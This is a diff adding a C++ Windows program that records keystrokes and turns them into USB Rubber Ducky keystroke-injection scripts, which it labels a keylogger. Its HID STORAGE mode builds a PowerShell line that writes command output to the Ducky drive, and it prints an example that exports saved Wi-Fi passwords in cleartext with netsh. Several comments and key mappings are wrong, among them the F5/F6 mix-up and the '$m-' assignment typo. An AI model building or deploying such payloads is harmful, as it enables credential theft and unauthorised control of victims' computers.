@@ -1,0 +1,465 @@
+#include <iostream>
+#include <windows.h>
+#include <fstream>
+#include <string>
+#include <limits>
+#include <vector>
+
+using namespace std;
+
+//declare functions
+void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int &attackMode);
+void FormatString(string file, unsigned char key, bool shift);
+void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, int &isComment);
+void SpecialKeys(string file, unsigned char key, int &counter);
+bool ChangeAttackMode(string file, unsigned char &key, int &attackMode);
+void CleanPayload(string file);
+
+//global variables
+
+int main() {
+    fstream fout;
+    //declare variables
+    bool bisString = false;
+    int isString, isComment, attackMode = 0;
+
+    string fileNumber;
+    cout << "File will be saved to payload[number].txt" << endl;
+    cout << "Enter file number: ";
+    cin >> fileNumber;
+    string file = "payload" + fileNumber + ".dd";
+    
+    cout << endl << "- - - KEY FUNCTIONS - - -" << endl << endl;
+    cout << "F1: Start/Stop String" << endl << endl 
+         << "F3: Start/Stop Comment" << endl << endl 
+         << "F6: Change Attack Mode (HID/STORAGE)"  << endl << endl;
+    Sleep(50);
+    //call main function
+    cout << "Keylogger started, will be saved to " << file << endl;
+    cout << "Press SHIFT+ESCAPE to exit . . ." << endl << endl;
+    CheckKeys(file, bisString, isString, isComment, attackMode);
+    //keylogger finished
+    cout << "\nLogger finished, keystrokes saved in " << file << " in Rubber DUCKY format" << endl;
+
+    cout << "Cleaning up file" << endl;
+    //call function to remove last line in payload.txt
+    CleanPayload(file);
+
+}
+
+void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int &attackMode) {
+    //open file
+    fstream fout;
+    fout.open(file.c_str(), ios::app);
+    if(!fout) {
+        cout << "Error opening file" << endl;
+    }
+
+    //declare variables
+    bool isPressed = false;
+    bool keyState[256] = {false};
+    bool bAttackMode = true;
+    unsigned char key;
+    int counter = 0;
+    string keydelay = "DELAY 50";
+
+    while(true)
+    {
+        Sleep(150); //sleep for 100ms to prevent high CPU usage
+        for(key = 8; key <= 255; key++)
+        {
+            isPressed = (GetAsyncKeyState(key) & 0x8000);
+
+            if(isPressed && !keyState[key])
+            {
+                keyState[key] = true;
+                
+
+                bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
+                bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
+                bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
+                
+                //cin.ignore(numeric_limits<streamsize>::max(), '\n'); // Clear input buffer
+                ChangeMode(file, key, bisString, isString, isComment);
+                bAttackMode = ChangeAttackMode(file, key, attackMode);
+                if(!bAttackMode)
+                {
+                    break;
+                }
+
+
+                if(!bisString)
+                {
+                    //main keys (when these 4 keys are released it will create a new line)
+                    if(ctrl && key == 0x11)
+                    {
+                        fout << "CTRL ";
+                        cout << "CTRL ";
+                        counter = 0; //reset ctrl
+                    }
+                    if(shift && key == 0x10)
+                    {
+                        fout << "SHIFT ";
+                        cout << "SHIFT ";
+                        counter = 0;
+                    }
+                    if(alt && key == 0x12)
+                    {
+                        fout << "ALT ";
+                        cout << "ALT ";
+                        counter = 0;
+                    }
+                    if(key == VK_LWIN)
+                    {
+                        fout << "GUI ";
+                        cout << "GUI ";
+                        counter = 0;
+                    }
+                    //if statements to check all special keys
+                    SpecialKeys(file, key, counter);
+
+                    if(key >= 0x30 && key <= 0x39)
+                    {
+                        fout << key << " ";
+                        cout << key << " ";
+                    }
+                    else if (key >= 0x41 && key <= 0x5A)
+                    {
+                            fout << char(key) << " ";
+                            cout << char(key) << " ";       
+                    }
+                }
+                else //call format string function
+                {
+                    FormatString(file, key, shift);
+                }
+                //exit program if SHIFT+ESC is pressed
+                if(key == 0x1B && GetAsyncKeyState(VK_SHIFT) & 0x8000){
+                    fout.close();
+                    return;
+                }
+            }
+            
+            if(!isPressed && keyState[key]){
+                keyState[key] = false;
+                if(key > 159 && key < 224 || key == VK_LWIN || key == VK_RETURN || key == VK_SPACE || key == VK_TAB || key == VK_BACK || key == VK_ESCAPE || key == VK_UP || key == VK_DOWN || key == VK_LEFT || key == VK_RIGHT){
+                    // cout << " - - - released";
+                    if(counter == 0 && !bisString){
+                    cout << endl;
+                    fout << endl;
+                    cout << keydelay << endl;
+                    fout << keydelay << endl;
+                    counter++;
+                    }
+                }
+            } 
+        }
+    }
+    return;
+}
+//creates a STRINGLN command in ducky language
+//begins/ends when ALT + 1 is pressed
+void FormatString(string file, unsigned char key, bool shift){
+    //declare variables
+    string stringdelay = "DELAY 600";
+
+    //open file
+    fstream fout;
+    fout.open(file.c_str(), ios::app); //ios::app used to append to file
+    if(!fout) {
+        cout << endl << "Error opening file" << endl;
+        return;
+    }
+
+    switch(key) 
+    {
+        //windows control keys
+        case VK_BACK: fout << "<->"; cout << "<->"; break;
+        case VK_TAB: fout << "\t"; cout << "\t"; break;
+        case VK_RETURN: fout << "\n" << stringdelay << endl << "STRINGLN ";
+                        cout << "\n" << stringdelay << endl << "STRINGLN "; break;
+        //special characters
+        case 0xBC: fout << ","; cout << ","; break;
+        case VK_OEM_PERIOD: fout << "."; cout << "."; break;
+        case VK_OEM_1: fout << ";"; cout << ";"; break;
+        case VK_OEM_2: fout << "/"; cout << ";"; break;                        
+        case VK_OEM_3: fout << "`"; cout << "`"; break; //top left corner of keyboard
+        case VK_OEM_4: fout << "["; cout << "["; break;
+        case VK_OEM_6: fout << "]"; cout << "]"; break;
+        case VK_OEM_5: fout << "\\"; cout << "\\"; break;
+        case VK_OEM_7: fout << "'"; cout << "'"; break;
+        case VK_SPACE: fout << " "; cout << " "; break;
+        
+        //F 1-12 keys and numpad keys`
+        case VK_NUMPAD0: fout << "0"; cout << "0"; break;
+        case VK_NUMPAD1: fout << "1"; cout << "1"; break;
+        case VK_NUMPAD2: fout << "2"; cout << "2"; break;
+        case VK_NUMPAD3: fout << "3"; cout << "3"; break;
+        case VK_NUMPAD4: fout << "4"; cout << "4"; break;
+        case VK_NUMPAD5: fout << "5"; cout << "5"; break;
+        case VK_NUMPAD6: fout << "6"; cout << "6"; break;
+        case VK_NUMPAD7: fout << "7"; cout << "7"; break;
+        case VK_NUMPAD8: fout << "8"; cout << "8"; break;
+        case VK_NUMPAD9: fout << "9"; cout << "9"; break;
+        case VK_MULTIPLY: fout << "*"; cout << "*"; break;
+        case VK_ADD: fout << "+"; cout << "+"; break;
+        case VK_SUBTRACT: fout << "-"; cout << "-"; break;
+        case VK_DECIMAL: fout << "."; cout << "."; break;
+        case VK_DIVIDE: fout << "/"; cout << "/"; break;     
+    }
+    if(key >= 0x30 && key <= 0x39)
+    {
+        cout << key;
+        fout << key;
+    }
+    else if (key >= 0x41 && key <= 0x5A)
+    {
+        if(shift){
+            cout << char(key);
+            fout << char(key);
+        }
+        else{
+            cout << char(key+32);
+            fout << char(key+32);
+        }       
+    }
+    fout.close();
+    return;
+}
+
+void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, int &isComment){
+    fstream fout;
+    fout.open(file.c_str(), ios::app); //ios::app used to append to file
+    if(!fout) {
+        cout << endl << "Error opening file" << endl;
+        return;
+    }
+
+    if(key == 0x70)
+    {
+        if(isString % 2 == 0){
+            //starts a string command in ducky language
+            if(isString == 0)
+            {
+                fout << endl << "$_JITTER_ENABLED = TRUE\n\n";
+                cout << endl << "$_JITTER_ENABLED = TRUE\n\n";
+                //this is a DUCKY function which sets small delay between typing each char
+                // in stringln statement
+            }
+            bisString = true;
+            cout << "STRINGLN ";
+            fout << "STRINGLN ";
+        }
+        else {
+            //ends a string command in ducky language
+            bisString = false;
+            cout << endl;
+            cout << "DELAY 600" << endl;
+            fout << endl;
+            fout << "DELAY 600" << endl;
+        }
+        isString++;
+    }
+    if(key == 0x72){
+        if(isComment % 2 == 0){
+            //starts a comment in ducky language
+            bisString = true;
+            cout << "REM ";
+            fout << "REM ";
+        }
+        else {
+            //ends a comment in ducky language
+            bisString = false;
+            cout << endl;
+            fout << endl;
+        }
+        isComment++;
+    }
+    fout.close();
+    return;
+}
+
+void SpecialKeys(string file, unsigned char key, int &counter){
+    fstream fout;
+    //open file
+    fout.open(file.c_str(), ios::app);
+    if(!fout){
+        cout << endl << "Error opening file" << endl;
+        return;
+    }
+    //check all special keys individually (multiple may be pressed at once)
+    if(key == VK_BACK){
+        fout << "BACKSPACE ";
+        cout << "BACKSPACE ";
+    }
+    if(key == VK_TAB){
+        fout << "TAB ";
+        cout << "TAB ";
+    }
+    if(key == VK_RETURN){
+        fout << "ENTER ";
+        cout << "ENTER ";
+    }
+    if(key == VK_CAPITAL){
+        fout << "CAPSLOCK ";
+        cout << "CAPSLOCK ";
+    }
+    if(key == VK_ESCAPE){
+        fout << "ESCAPE ";
+        cout << "ESCAPE ";
+    }
+    if(key == 0xBC){
+        fout << "COMMA ";
+        cout << "COMMA ";
+    }
+    if(key == VK_OEM_PERIOD){
+        fout << "PERIOD ";
+        cout << "PERIOD ";
+    }
+    if(key == VK_OEM_1){
+        fout << "SEMICOLON ";
+        cout << "SEMICOLON ";
+    }
+    if(key == VK_OEM_2){
+        fout << "BACKSLASH ";
+        cout << "BACKSLASH ";
+    }
+    if(key == VK_OEM_3){
+        fout << "TILDE ";
+        cout << "TILDE ";
+    }
+    if(key == VK_OEM_4){
+        fout << "LEFTBRACKET ";
+        cout << "LEFTBRACKET ";
+    }
+    if(key == VK_OEM_5){
+        fout << "FORWARDSLASH ";
+        cout << "FORWARDSLASH ";
+    }
+    if(key == VK_OEM_6){
+        fout << "RIGHTBRACKET ";
+        cout << "RIGHTBRACKET ";
+    }
+    if(key == VK_OEM_7){
+        fout << "QUOTE ";
+        cout << "QUOTE ";
+    }
+    if(key == VK_SPACE){
+        fout << "SPACE ";
+        cout << "SPACE ";
+    }
+    if(key == VK_LEFT){
+        fout << "LEFT ";
+        cout << "LEFT ";
+    }
+    if(key == VK_RIGHT){
+        fout << "RIGHT ";
+        cout << "RIGHT ";
+    }
+    if(key == VK_UP){
+        fout << "UP ";
+        cout << "UP ";
+    }
+    if(key == VK_DOWN){
+        fout << "DOWN ";
+        cout << "DOWN ";
+    }
+    if(key == VK_INSERT){
+        fout << "INSERT ";
+        cout << "INSERT ";
+    }
+    if(key == VK_HOME){
+        fout << "HOME ";
+        cout << "HOME ";
+    }
+    if(key == VK_END){
+        fout << "END ";
+        cout << "END ";
+    }
+    if(key == VK_PRIOR){
+        fout << "PAGEUP ";
+        cout << "PAGEUP ";
+    }
+    if(key == VK_NEXT){
+        fout << "PAGEDOWN ";
+        cout << "PAGEDOWN ";
+    }
+
+    counter = 0;
+    fout.close();
+    return;
+}
+
+bool ChangeAttackMode(string file, unsigned char &key, int &attackMode){
+
+    fstream fout;
+    fout.open(file.c_str(), ios::app);
+    if(!fout){
+        cout << endl << "Error opening file" << endl;
+        return true;
+    }
+    //F5 to change attack mode of RUBBER DUCKY
+
+    if(key == 0x75){
+        if(attackMode % 2 == 0){
+            cout << endl << "ATTACKMODE HID\n\n";
+            fout << endl << "ATTACKMODE HID\n\n";
+            attackMode++;
+            return true;
+        }
+        else {
+            string input;
+            cout << endl << "ATTACKMODE HID STORAGE" << endl;
+            fout << endl << "ATTACKMODE HID STORAGE" << endl;
+            cout << "\nREM - - -> Input powershell commands in sequential order seperated by ;<- - -" << endl;
+            cout << "REM --- Whatever is output to powershell terminal will be saved to a file on the RUBBER DUCKY ---" << endl << endl;
+            cout << "REM ---> EXAMPLES:" << endl << 
+                    "REM #1) cd $d; netsh wlan export profile key=clear;" << endl << endl
+                 << "REM #2) $env:computername >> $m:\\computer_names.txt" << endl << endl;
+            getline(cin, input);
+            cout << endl << "STRINGLN powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
+                 << input << "\"" << endl << endl;
+            fout << endl << "STRINGLN powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
+                 << input << "\"" << endl << endl;
+            attackMode++;
+                 return false;
+        }
+    }
+    fout.close();
+    return true;
+}
+
+void CleanPayload(string file){
+    fstream fin;
+    fstream fout;
+    //declare variables
+    vector<string> contents;
+    string content;
+    int i = 0;
+
+    fin.open(file.c_str());
+    if(!fin){
+        cout << endl << endl << "Error opening file" << endl;
+        return;
+    }
+    cout << endl << " - - - Testing output - - -" << endl << endl << endl;
+    //add current text file to vector for transfer
+    while(getline(fin, content)){
+        contents.push_back(content);
+        Sleep(100);
+        i++;
+    } 
+    fin.close();
+
+    //replace file with contents vector (old file minus last line)
+    fout.open(file.c_str());
+    if(!fout){
+        cout << "Error opening file" << endl;
+        return;
+    }
+    for(int j = 0; j < contents.size() - 1; j++){
+        fout << contents[j] << endl;
+        cout << contents[j] << endl;
+    }
+    fout.close();
+}
